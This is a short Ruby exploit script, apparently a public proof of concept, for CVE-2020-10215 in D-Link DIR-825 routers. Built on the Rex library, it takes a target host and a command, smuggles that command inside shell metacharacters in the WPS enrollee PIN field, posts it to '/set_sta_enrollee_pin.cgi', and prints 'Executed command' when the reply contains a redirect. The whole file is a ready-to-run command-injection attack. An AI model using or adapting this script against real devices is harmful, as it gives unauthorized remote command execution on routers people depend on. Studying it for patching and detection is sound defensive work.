#!/usr/bin/env ruby
# ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DIR-825/REVB/DIR-825_REVB1_FIRMWARE_PATCH_v2.10B02.zip

require 'rex'

host = ARGV[0]
cmd  = ARGV[1]

def usage
 puts "[*] CVE-2020-10215 DLINK DIR-825"
 puts "[*] #{$0} <host> [cmd]"
 exit
end

usage if ARGV.size < 1

begin
sock = Rex::Proto::Http::Client.new(host, 
                                    port = 80, 
                                    context = {}, 
                                    ssl = false)

x = Rex::Text.uri_encode("||`` #' |" + cmd + "||`` #\" |")

data = "html_response_page=wps_back.asp&html_response_return_page=do_wps.asp&reboot_type=none&disable_wps_pin=0&wps_configured_mode=0&wps_sta_enrollee_pin=#{x}&wps_pin_radio=0"

req = sock.request_cgi(
{
	'uri'   => '/set_sta_enrollee_pin.cgi',
	'version' => '1.0',
	'method' => 'POST',
        'data' => data,
        'headers' => {
         'Upgrade-Insecure-Request' => '1',
         'Referer' => "http://#{host}/",
         'Connection' => 'close',
         'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
})

sock.send_request(req)
data = sock.read_response()

if data.body.include?("redirect")
 puts "[*] Executed command: #{cmd}"
else
 return 
end
rescue => e
puts "[!] #{e.to_s}"
end
